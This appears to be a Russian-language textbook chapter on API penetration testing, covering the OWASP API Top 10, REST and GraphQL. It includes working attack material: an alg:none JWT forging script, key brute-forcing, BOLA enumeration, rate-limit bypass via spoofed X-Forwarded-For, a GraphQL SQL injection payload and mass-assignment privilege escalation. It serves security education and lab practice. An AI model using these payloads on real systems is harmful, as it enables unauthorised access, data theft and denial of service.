# Глава 12.4: Тестирование API: REST, GraphQL, OWASP API

## Введение

API (Application Programming Interface) стали основой современных веб-приложений. С ростом микросервисной архитектуры, мобильных приложений и SPA (Single Page Applications) API-безопасность приобретает критическое значение.

По данным Gartner, к 2024 году API-атаки стали самым распространённым вектором атак на веб-приложения. OWASP выпустил специальный список "API Security Top 10", отдельный от традиционного OWASP Top 10.

---

## 12.4.1 OWASP API Security Top 10

| # | Уязвимость                                      | Описание                                              |
|---|--------------------------------------------------|-------------------------------------------------------|
| API1 | Broken Object Level Authorization (BOLA)   | Доступ к объектам других пользователей               |
| API2 | Broken Authentication                       | Слабая аутентификация, токены без истечения          |
| API3 | Broken Object Property Level Authorization | Изменение защищённых свойств объекта                 |
| API4 | Unrestricted Resource Consumption           | Отсутствие rate limiting, нет лимитов запросов       |
| API5 | Broken Function Level Authorization         | Доступ к административным функциям                   |
| API6 | Unrestricted Access to Sensitive Business Flows | Злоупотребление бизнес-логикой                  |
| API7 | Server Side Request Forgery                 | SSRF через параметры API                             |
| API8 | Security Misconfiguration                   | Неправильная настройка CORS, заголовков              |
| API9 | Improper Inventory Management               | Устаревшие версии API, незадокументированные         |
| API10 | Unsafe Consumption of APIs                 | Доверие к третьим API без проверки                   |

---

## 12.4.2 Инструменты для тестирования API

### Postman

```javascript
// Настройка тестов в Postman (Pre-request Script)
const baseUrl = pm.environment.get("base_url");
const token = pm.environment.get("token");

// Автоматическое добавление токена
pm.request.headers.add({
    key: "Authorization",
    value: `Bearer ${token}`
});

// Тест на утечку информации (Tests tab)
pm.test("Response should not contain passwords", function() {
    const jsonData = pm.response.json();
    const responseStr = JSON.stringify(jsonData);
    pm.expect(responseStr).to.not.include("password");
    pm.expect(responseStr).to.not.include("secret");
    pm.expect(responseStr).to.not.include("api_key");
});

// Тест на правильный статус
pm.test("Status code is 200", function() {
    pm.response.to.have.status(200);
});

// Тест авторизации
pm.test("Should not expose other users data", function() {
    const jsonData = pm.response.json();
    const currentUserId = pm.environment.get("current_user_id");
    if (Array.isArray(jsonData)) {
        jsonData.forEach(item => {
            pm.expect(item.user_id).to.equal(parseInt(currentUserId));
        });
    }
});
```

### curl — базовые API-запросы

```bash
# GET запрос
curl https://api.example.com/users

# GET с заголовком
curl -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     https://api.example.com/users/1

# POST запрос
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "password123"}' \
     https://api.example.com/auth/login

# PUT запрос
curl -X PUT \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"email": "new@example.com"}' \
     https://api.example.com/users/1

# DELETE запрос
curl -X DELETE \
     -H "Authorization: Bearer TOKEN" \
     https://api.example.com/users/1

# Verbose режим (показывает заголовки)
curl -v https://api.example.com/users

# Следовать редиректам
curl -L https://api.example.com/users

# Сохранить cookies
curl -c cookies.txt https://api.example.com/login
curl -b cookies.txt https://api.example.com/profile

# Показать только заголовки ответа
curl -I https://api.example.com/users

# Прокси (через Burp Suite)
curl -x http://127.0.0.1:8080 \
     -k \
     -H "Authorization: Bearer TOKEN" \
     https://api.example.com/users

# С параметрами query string
curl "https://api.example.com/users?page=1&limit=10&sort=id"

# Загрузка файла
curl -X POST \
     -H "Authorization: Bearer TOKEN" \
     -F "file=@/path/to/file.jpg" \
     https://api.example.com/upload
```

---

## 12.4.3 REST API — тестирование аутентификации

### JWT (JSON Web Token) — анализ и атаки

```bash
# Декодирование JWT токена
# Формат: header.payload.signature (base64url)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoidXNlciIsImV4cCI6MTcwOTAwMDAwMH0.SIGNATURE"

# Декодирование header
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
# {"alg": "HS256", "typ": "JWT"}

# Декодирование payload
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# {
#   "user_id": 1,
#   "role": "user",
#   "exp": 1709000000
# }

# Проверка алгоритма None
# Если сервер принимает alg:none — это критическая уязвимость!
python3 << 'PYTHON'
import base64, json

def b64encode_nopad(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Создание токена без подписи
header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 1, "role": "admin", "exp": 9999999999}

header_b64 = b64encode_nopad(json.dumps(header).encode())
payload_b64 = b64encode_nopad(json.dumps(payload).encode())

# Токен без подписи
forged_token = f"{header_b64}.{payload_b64}."
print(f"Forged token: {forged_token}")
PYTHON

# Использование jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

# Анализ токена
python3 jwt_tool.py TOKEN

# Атака alg:none
python3 jwt_tool.py TOKEN -X a

# Атака HS/RS confusion (RS256 -> HS256)
python3 jwt_tool.py TOKEN -X s -pk public.pem

# Брутфорс ключа
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Изменение claims и пересоздание токена
python3 jwt_tool.py TOKEN -T  # Интерактивное изменение
```

### API Key Testing

```bash
# Поиск API-ключей в ответах
# В заголовках
curl -v https://api.example.com/users 2>&1 | grep -i "api.key\|x-api-key\|authorization"

# В теле ответа
curl https://api.example.com/profile | python3 -m json.tool | grep -i "key\|token\|secret"

# В HTML источнике
curl https://example.com/ | grep -oE '[a-zA-Z0-9_-]{32,}' | sort -u

# Тест на передачу ключа разными способами
# Query parameter
curl "https://api.example.com/data?api_key=YOUR_KEY"

# Header
curl -H "X-API-Key: YOUR_KEY" https://api.example.com/data

# Basic Auth
curl -u "api_key:YOUR_KEY" https://api.example.com/data

# Проверка истечения токена
# Используем истёкший токен
curl -H "Authorization: Bearer EXPIRED_TOKEN" https://api.example.com/protected
# Ожидаем 401, если получаем 200 — уязвимость!
```

---

## 12.4.4 BOLA (Broken Object Level Authorization)

BOLA — наиболее распространённая и опасная уязвимость API. Возникает когда пользователь может получить доступ к объектам других пользователей, изменив идентификатор в запросе.

```bash
# Сценарий: Пользователь 1 получает свой профиль
curl -H "Authorization: Bearer USER1_TOKEN" \
     https://api.example.com/users/1/profile

# BOLA-тест: Пользователь 1 пытается получить профиль пользователя 2
curl -H "Authorization: Bearer USER1_TOKEN" \
     https://api.example.com/users/2/profile  # Должно вернуть 403!

# Автоматизированная проверка BOLA
python3 << 'PYTHON'
import requests

BASE_URL = "https://api.example.com"
USER1_TOKEN = "user1_token_here"
USER2_TOKEN = "user2_token_here"

headers_user1 = {"Authorization": f"Bearer {USER1_TOKEN}"}
headers_user2 = {"Authorization": f"Bearer {USER2_TOKEN}"}

# Получаем свои данные
r1 = requests.get(f"{BASE_URL}/users/1/orders", headers=headers_user1)
print(f"User1 own orders: {r1.status_code}")

# Пробуем получить данные другого пользователя
r2 = requests.get(f"{BASE_URL}/users/2/orders", headers=headers_user1)
print(f"User1 accessing User2 orders: {r2.status_code}")

if r2.status_code == 200:
    print("[CRITICAL] BOLA vulnerability found!")
    print(f"Exposed data: {r2.json()}")
else:
    print(f"[OK] Properly restricted: {r2.status_code}")

# Перебор ID объектов
print("\nTesting object ID enumeration:")
for obj_id in range(1, 20):
    r = requests.get(f"{BASE_URL}/orders/{obj_id}", headers=headers_user1)
    if r.status_code == 200:
        print(f"  [EXPOSED] Order {obj_id}: {r.json()}")
    elif r.status_code == 403:
        print(f"  [OK] Order {obj_id}: Forbidden")
    elif r.status_code == 404:
        print(f"  [INFO] Order {obj_id}: Not found")
PYTHON

# Проверка GUID вместо числовых ID
curl -H "Authorization: Bearer TOKEN" \
     "https://api.example.com/documents/550e8400-e29b-41d4-a716-446655440000"

# Тест с разными форматами ID
for id in 1 2 100 0 -1 9999999 "admin" "null" "undefined"; do
    echo -n "ID $id: "
    curl -s -o /dev/null -w "%{http_code}" \
         -H "Authorization: Bearer TOKEN" \
         "https://api.example.com/users/$id"
    echo
done
```

---

## 12.4.5 Rate Limiting — тестирование и обход

```bash
# Проверка наличия rate limiting
for i in $(seq 1 20); do
    echo -n "Request $i: "
    curl -s -o /dev/null -w "%{http_code}" \
         -X POST \
         -H "Content-Type: application/json" \
         -d '{"email": "test@test.com", "password": "wrong_pass"}' \
         https://api.example.com/auth/login
    echo
done

# Обход rate limiting через смену IP (X-Forwarded-For)
for i in $(seq 1 50); do
    curl -s -o /dev/null -w "%{http_code}" \
         -H "X-Forwarded-For: 10.0.0.$i" \
         -H "X-Real-IP: 10.0.0.$i" \
         -X POST \
         -d '{"email": "admin@example.com", "password": "test"}' \
         https://api.example.com/auth/login
    echo " (X-Forwarded-For: 10.0.0.$i)"
done

# Обход через вариации заголовков
for header in "X-Forwarded-For" "X-Real-IP" "CF-Connecting-IP" "True-Client-IP" "X-Client-IP"; do
    echo -n "$header: "
    curl -s -o /dev/null -w "%{http_code}" \
         -H "$header: 192.168.1.$(shuf -i 1-254 -n 1)" \
         https://api.example.com/auth/login
    echo
done

# Python-скрипт для тестирования rate limiting
python3 << 'PYTHON'
import requests
import time
import threading
from collections import Counter

URL = "https://api.example.com/auth/login"
HEADERS = {"Content-Type": "application/json"}
DATA = '{"email": "test@test.com", "password": "wrongpass"}'

results = []
lock = threading.Lock()

def send_request(req_num):
    try:
        r = requests.post(URL, headers=HEADERS, data=DATA, timeout=5)
        with lock:
            results.append(r.status_code)
            print(f"Request {req_num}: {r.status_code}")
    except Exception as e:
        with lock:
            results.append(0)
            print(f"Request {req_num}: Error - {e}")

# Последовательные запросы
print("=== Sequential Requests ===")
for i in range(20):
    send_request(i+1)
    time.sleep(0.1)

print(f"\nStatus code distribution: {Counter(results)}")

# Параллельные запросы
results = []
print("\n=== Parallel Requests ===")
threads = []
for i in range(50):
    t = threading.Thread(target=send_request, args=(i+1,))
    threads.append(t)

for t in threads:
    t.start()
for t in threads:
    t.join()

print(f"\nStatus code distribution: {Counter(results)}")
PYTHON
```

---

## 12.4.6 GraphQL — особенности тестирования

GraphQL — язык запросов для API, отличающийся от REST тем, что клиент сам определяет, какие данные получить.

### GraphQL Introspection

```bash
# Включена ли introspection (получение схемы)?
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"query": "{ __schema { types { name } } }"}' \
     https://api.example.com/graphql

# Полная схема
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"query": "{ __schema { queryType { fields { name description args { name type { name kind } } } } } }"}' \
     https://api.example.com/graphql | python3 -m json.tool

# Получение всех мутаций
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"query": "{ __schema { mutationType { fields { name } } } }"}' \
     https://api.example.com/graphql

# InQL Burp Extension — автоматическая introspection
# Доступно как расширение Burp Suite
```

### Инструмент graphw00f — обнаружение GraphQL

```bash
# Установка
pip3 install graphw00f

# Обнаружение GraphQL эндпоинта
graphw00f -d -t https://example.com

# Расширенное обнаружение
graphw00f -f -t https://example.com \
          -H "Authorization: Bearer TOKEN"
```

### GraphQL-атаки

```bash
# 1. Introspection — утечка схемы
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
  "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }"
}' \
     https://api.example.com/graphql

# 2. Batch queries — обход rate limiting
curl -X POST \
     -H "Content-Type: application/json" \
     -d '[
  {"query": "{ user(id: 1) { email password } }"},
  {"query": "{ user(id: 2) { email password } }"},
  {"query": "{ user(id: 3) { email password } }"}
]' \
     https://api.example.com/graphql

# 3. Aliases — обход rate limiting для одной операции
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
  "query": "{ 
    attempt1: login(username: \"admin\", password: \"pass1\") { token }
    attempt2: login(username: \"admin\", password: \"pass2\") { token }
    attempt3: login(username: \"admin\", password: \"pass3\") { token }
  }"
}' \
     https://api.example.com/graphql

# 4. Вложенные запросы (DoS через depth)
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
  "query": "{ user { friends { friends { friends { friends { friends { name } } } } } } }"
}' \
     https://api.example.com/graphql

# 5. Field suggestions — угадывание полей
# Если typo в имени поля, GraphQL иногда подсказывает правильное
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"query": "{ user { pasword } }"}' \
     https://api.example.com/graphql
# Ответ: "Did you mean 'password'?"

# 6. GraphQL Injection
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"query": "{ user(id: \"1\") { name } }"}' \
     https://api.example.com/graphql

# SQL через GraphQL
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"query": "{ user(id: \"1 UNION SELECT 1,username,password,4 FROM users--\") { name } }"}' \
     https://api.example.com/graphql
```

### Python-скрипт для GraphQL Introspection

```python
#!/usr/bin/env python3
"""GraphQL Security Tester"""

import requests
import json

class GraphQLTester:
    def __init__(self, url, headers=None):
        self.url = url
        self.headers = headers or {"Content-Type": "application/json"}
    
    def query(self, query, variables=None):
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        
        r = requests.post(
            self.url,
            json=payload,
            headers=self.headers,
            verify=False
        )
        return r
    
    def test_introspection(self):
        """Проверка доступности introspection"""
        print("[*] Testing introspection...")
        r = self.query("{ __schema { types { name } } }")
        
        if r.status_code == 200 and "errors" not in r.json():
            types = [t["name"] for t in r.json()["data"]["__schema"]["types"]]
            print(f"[+] Introspection enabled! Found {len(types)} types")
            return types
        else:
            print("[-] Introspection disabled or error")
            return []
    
    def get_queries(self):
        """Получение всех запросов"""
        print("\n[*] Getting available queries...")
        r = self.query("""
        {
            __schema {
                queryType {
                    fields {
                        name
                        description
                        args {
                            name
                            type {
                                name
                                kind
                                ofType { name kind }
                            }
                        }
                    }
                }
            }
        }
        """)
        
        if r.status_code == 200 and "data" in r.json():
            fields = r.json()["data"]["__schema"]["queryType"]["fields"]
            print(f"[+] Found {len(fields)} queries:")
            for field in fields:
                args = ", ".join([a["name"] for a in field.get("args", [])])
                print(f"  - {field['name']}({args}): {field.get('description', '')}")
            return fields
        return []
    
    def get_mutations(self):
        """Получение всех мутаций"""
        print("\n[*] Getting available mutations...")
        r = self.query("""
        {
            __schema {
                mutationType {
                    fields {
                        name
                        description
                        args { name }
                    }
                }
            }
        }
        """)
        
        if r.status_code == 200 and "data" in r.json():
            mutation_type = r.json()["data"]["__schema"].get("mutationType")
            if mutation_type:
                fields = mutation_type.get("fields", [])
                print(f"[+] Found {len(fields)} mutations:")
                for field in fields:
                    print(f"  - {field['name']}: {field.get('description', '')}")
                return fields
        return []
    
    def test_batch(self):
        """Тест batch queries"""
        print("\n[*] Testing batch queries...")
        payload = [
            {"query": "{ __typename }"},
            {"query": "{ __typename }"}
        ]
        
        r = requests.post(self.url, json=payload, headers=self.headers)
        if r.status_code == 200 and isinstance(r.json(), list):
            print("[+] Batch queries supported! (Rate limit bypass possible)")
        else:
            print("[-] Batch queries not supported")
    
    def test_depth(self, depth=10):
        """Тест глубины вложенности (DoS)"""
        print(f"\n[*] Testing query depth ({depth} levels)...")
        # Построение глубоко вложенного запроса (адаптировать под схему)
        nested = "user { id " + "friends { " * depth + "name" + " }" * depth + " }"
        r = self.query(f"{{ {nested} }}")
        print(f"  Status: {r.status_code}")
        if r.status_code != 400:
            print("[!] No depth limiting detected!")


# Использование
tester = GraphQLTester(
    "https://api.example.com/graphql",
    headers={"Content-Type": "application/json", "Authorization": "Bearer TOKEN"}
)

types = tester.test_introspection()
queries = tester.get_queries()
mutations = tester.get_mutations()
tester.test_batch()
tester.test_depth()
```

---

## 12.4.7 Mass Assignment и Broken Object Property Level Authorization

```bash
# API3: Broken Object Property Level Authorization
# Сценарий: при регистрации можно передать дополнительные поля

# Нормальный запрос
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"username": "newuser", "password": "password123", "email": "new@example.com"}' \
     https://api.example.com/users/register

# Атака: добавляем неожиданные поля
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
       "username": "newuser", 
       "password": "password123", 
       "email": "new@example.com",
       "role": "admin",          # Попытка стать администратором
       "is_admin": true,
       "credits": 99999,
       "verified": true
     }' \
     https://api.example.com/users/register

# При обновлении профиля
curl -X PUT \
     -H "Authorization: Bearer USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "email": "new@example.com",
       "role": "admin",          # Попытка повышения привилегий
       "balance": 10000
     }' \
     https://api.example.com/users/profile

# Тестирование с ffuf — поиск принимаемых полей
ffuf -u https://api.example.com/users/profile \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -X PUT \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"FUZZ": "test_value"}' \
     -mc 200 \
     -mr "success|updated|ok"
```

---

## 12.4.8 Полная методология тестирования API

```python
#!/usr/bin/env python3
"""
Комплексный тестировщик API безопасности
"""

import requests
import json
import sys
from urllib.parse import urljoin

class APISecurityTester:
    def __init__(self, base_url, token=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        
        if token:
            self.session.headers.update({
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json"
            })
        
        self.findings = []
    
    def add_finding(self, severity, title, description, request_data=None):
        self.findings.append({
            "severity": severity,
            "title": title,
            "description": description,
            "request": request_data
        })
        print(f"[{severity.upper()}] {title}")
    
    def test_cors(self):
        """Тестирование CORS"""
        print("\n=== CORS Testing ===")
        
        test_origins = [
            "https://evil.com",
            "null",
            f"https://evil.{self.base_url.split('.')[-1]}",
            "http://localhost"
        ]
        
        for origin in test_origins:
            r = self.session.get(
                f"{self.base_url}/api/users",
                headers={"Origin": origin}
            )
            
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            
            if acao == origin or acao == "*":
                if acac.lower() == "true":
                    self.add_finding(
                        "critical",
                        "CORS Misconfiguration",
                        f"Origin {origin} reflected with credentials"
                    )
                else:
                    self.add_finding(
                        "medium",
                        "CORS - Origin Reflection",
                        f"Origin {origin} reflected: {acao}"
                    )
    
    def test_http_methods(self, endpoint="/api/users"):
        """Тестирование HTTP-методов"""
        print(f"\n=== HTTP Methods Testing ({endpoint}) ===")
        
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]
        allowed = []
        
        for method in methods:
            r = self.session.request(method, f"{self.base_url}{endpoint}")
            print(f"  {method}: {r.status_code}")
            
            if r.status_code not in [405, 404]:
                allowed.append(method)
        
        if "TRACE" in allowed:
            self.add_finding("medium", "TRACE Method Enabled",
                           "TRACE method can be used for XST attacks")
        
        # Проверка OPTIONS
        r = self.session.options(f"{self.base_url}{endpoint}")
        allow_header = r.headers.get("Allow", r.headers.get("X-Allowed-Methods", ""))
        print(f"  Allowed (from header): {allow_header}")
    
    def test_authentication(self):
        """Тестирование аутентификации"""
        print("\n=== Authentication Testing ===")
        
        # 1. Запрос без токена
        session_no_auth = requests.Session()
        session_no_auth.verify = False
        
        protected_endpoints = [
            "/api/users",
            "/api/admin",
            "/api/profile",
            "/api/orders"
        ]
        
        for endpoint in protected_endpoints:
            r = session_no_auth.get(f"{self.base_url}{endpoint}")
            if r.status_code == 200:
                self.add_finding(
                    "critical",
                    "Missing Authentication",
                    f"Endpoint {endpoint} accessible without authentication"
                )
            print(f"  {endpoint}: {r.status_code} (no auth)")
        
        # 2. Тест с невалидным токеном
        r = self.session.get(
            f"{self.base_url}/api/users",
            headers={"Authorization": "Bearer invalid_token_12345"}
        )
        if r.status_code == 200:
            self.add_finding(
                "critical",
                "Invalid Token Accepted",
                "Server accepts invalid authentication tokens"
            )
    
    def test_bola(self, endpoint_template="/api/users/{id}", start_id=1, count=10):
        """Тестирование BOLA"""
        print(f"\n=== BOLA Testing ({endpoint_template}) ===")
        
        for obj_id in range(start_id, start_id + count):
            url = f"{self.base_url}{endpoint_template.format(id=obj_id)}"
            r = self.session.get(url)
            
            if r.status_code == 200:
                print(f"  ID {obj_id}: ACCESSIBLE")
                if obj_id != start_id:  # Assuming first is our own
                    self.add_finding(
                        "critical",
                        "BOLA Vulnerability",
                        f"Can access object ID {obj_id} without authorization",
                        {"url": url, "method": "GET", "response": r.text[:200]}
                    )
            else:
                print(f"  ID {obj_id}: {r.status_code}")
    
    def test_rate_limiting(self, endpoint="/api/auth/login"):
        """Тестирование rate limiting"""
        print(f"\n=== Rate Limiting Test ({endpoint}) ===")
        
        success_codes = 0
        for i in range(30):
            r = self.session.post(
                f"{self.base_url}{endpoint}",
                json={"email": "test@test.com", "password": f"wrong{i}"}
            )
            if r.status_code in [200, 302]:
                success_codes += 1
        
        if success_codes == 30:
            self.add_finding(
                "high",
                "No Rate Limiting",
                f"Endpoint {endpoint} has no rate limiting"
            )
    
    def check_security_headers(self):
        """Проверка заголовков безопасности"""
        print("\n=== Security Headers Check ===")
        
        r = self.session.get(f"{self.base_url}/")
        
        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": None,
            "Content-Security-Policy": None,
            "Strict-Transport-Security": None,
            "X-XSS-Protection": None
        }
        
        for header, expected_value in security_headers.items():
            value = r.headers.get(header)
            if value:
                print(f"  [OK] {header}: {value}")
            else:
                print(f"  [MISSING] {header}")
                self.add_finding(
                    "low",
                    f"Missing Security Header: {header}",
                    f"Header {header} is not set"
                )
    
    def generate_report(self):
        """Генерация отчёта"""
        print("\n" + "="*50)
        print("SECURITY TEST REPORT")
        print("="*50)
        
        if not self.findings:
            print("No vulnerabilities found!")
            return
        
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        sorted_findings = sorted(self.findings, key=lambda x: severity_order.get(x["severity"], 5))
        
        for finding in sorted_findings:
            print(f"\n[{finding['severity'].upper()}] {finding['title']}")
            print(f"  Description: {finding['description']}")
            if finding.get("request"):
                print(f"  Request: {finding['request']}")
        
        print(f"\nTotal findings: {len(self.findings)}")
        for sev in ["critical", "high", "medium", "low"]:
            count = sum(1 for f in self.findings if f["severity"] == sev)
            if count:
                print(f"  {sev.capitalize()}: {count}")


# Запуск тестов
tester = APISecurityTester("https://api.example.com", token="YOUR_TOKEN")
tester.test_cors()
tester.test_http_methods()
tester.test_authentication()
tester.test_bola()
tester.test_rate_limiting()
tester.check_security_headers()
tester.generate_report()
```

---

## 12.4.9 Документация API и анализ Swagger/OpenAPI

```bash
# Поиск документации API
curl https://api.example.com/swagger.json
curl https://api.example.com/openapi.json
curl https://api.example.com/api/docs
curl https://api.example.com/v1/swagger-ui.html

# Конвертация Swagger в curl-команды
# Установка
npm install -g swaggerhub-cli

# Анализ swagger.json
cat swagger.json | python3 << 'PYTHON'
import json, sys

with open("swagger.json") as f:
    spec = json.load(f)

base_url = spec.get("host", "api.example.com")
schemes = spec.get("schemes", ["https"])
base_path = spec.get("basePath", "/")

print(f"API Base: {schemes[0]}://{base_url}{base_path}")
print(f"\nEndpoints:")

paths = spec.get("paths", {})
for path, methods in paths.items():
    for method, details in methods.items():
        if method.upper() in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
            security = details.get("security", [])
            auth_required = bool(security)
            print(f"  [{method.upper()}] {path} - Auth: {auth_required}")
            
            # Параметры
            params = details.get("parameters", [])
            for param in params:
                print(f"    Param: {param.get('name')} ({param.get('in')}) - Required: {param.get('required', False)}")
PYTHON

# kiterunner — сканер API эндпоинтов
# https://github.com/assetnote/kiterunner
kr scan https://api.example.com -w routes-large.kite
kr brute https://api.example.com --wordlist /path/to/wordlist.txt
```

---

## Итоги главы

В этой главе мы изучили:

- **OWASP API Top 10** — актуальный список угроз для API
- **Инструменты** — curl, Postman, Insomnia для тестирования API
- **JWT-атаки** — algorithm confusion, none algorithm, key brute-force
- **BOLA** — тестирование нарушений авторизации на уровне объектов
- **GraphQL** — introspection, batch queries, depth attacks
- **Rate Limiting** — тестирование и методы обхода
- **Mass Assignment** — атаки на свойства объектов
- **Автоматизацию** — Python-скрипты для систематического тестирования

---

## Практические задания

### Задание 1: JWT-анализ
Получите JWT-токен с любого учебного сайта (HackTheBox, TryHackMe) и:
- Декодируйте header и payload
- Проверьте алгоритм шифрования
- Попробуйте атаку "alg:none"
- Попробуйте брутфорс ключа

### Задание 2: BOLA-тест
На платформе OWASP WebGoat (docker):
```bash
docker run -p 8080:8080 -t webgoat/webgoat
```
- Найдите уязвимые к BOLA эндпоинты
- Получите данные другого пользователя
- Задокументируйте шаги воспроизведения

### Задание 3: GraphQL Security
На `https://graphql.cryptopals.com` или учебном сервере:
- Выполните introspection
- Определите все queries и mutations
- Проверьте наличие batch attacks
- Попробуйте SQL-инъекцию через GraphQL

### Задание 4: API Rate Limiting
Настройте локальный тестовый API (Node.js Express):
```javascript
const express = require('express');
const app = express();

app.post('/api/login', (req, res) => {
    res.json({ status: 'ok' });
});

app.listen(3000);
```
- Определите, есть ли rate limiting
- Реализуйте атаку с X-Forwarded-For bypass
- Добавьте защиту и проверьте её эффективность

### Задание 5: Полный API-пентест
Используя OWASP crAPI (Completely Ridiculous API):
```bash
git clone https://github.com/OWASP/crAPI
cd crAPI && docker-compose up
```
Проведите полное тестирование всего API согласно OWASP API Top 10.

